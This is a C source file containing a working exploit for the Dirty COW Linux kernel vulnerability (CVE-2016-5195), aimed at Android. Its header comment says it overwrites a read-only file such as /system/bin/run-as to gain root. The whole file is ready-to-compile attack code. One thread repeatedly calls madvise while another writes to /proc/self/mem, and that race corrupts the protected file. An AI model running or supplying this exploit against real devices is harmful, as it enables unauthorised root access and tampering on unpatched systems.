/*
 * CVE-2016-5195 (Dirty COW) exploit for Android
 * This exploit overwrites a target file (e.g., /system/bin/run-as) to gain root.
 */

#include <stdio.h>
#include <sys/mman.h>
#include <fcntl.h>
#include <pthread.h>
#include <unistd.h>
#include <sys/stat.h>
#include <string.h>
#include <stdint.h>

void *map;
int f;
struct stat st;
char *name;

void *madviseThread(void *arg) {
    char *str = (char *)arg;
    int i, c = 0;
    for (i = 0; i < 100000000; i++) {
        c += madvise(map, 100, MADV_DONTNEED);
    }
    printf("madvise %d\n", c);
}

void *procselfmemThread(void *arg) {
    char *str = (char *)arg;
    int f = open("/proc/self/mem", O_RDWR);
    int i, c = 0;
    for (i = 0; i < 100000000; i++) {
        lseek(f, (uintptr_t)map, SEEK_SET);
        c += write(f, str, strlen(str));
    }
    printf("procselfmem %d\n", c);
}

int main(int argc, char *argv[]) {
    if (argc < 3) {
        fprintf(stderr, "Usage: %s <target_file> <new_content>\n", argv[0]);
        return 1;
    }

    name = argv[1];
    char *new_content = argv[2];

    f = open(name, O_RDONLY);
    fstat(f, &st);
    map = mmap(NULL, st.st_size, PROT_READ, MAP_PRIVATE, f, 0);
    printf("mmap %p\n", map);

    pthread_t pth1, pth2;
    pthread_create(&pth1, NULL, madviseThread, new_content);
    pthread_create(&pth2, NULL, procselfmemThread, new_content);

    pthread_join(pth1, NULL);
    pthread_join(pth2, NULL);

    return 0;
}

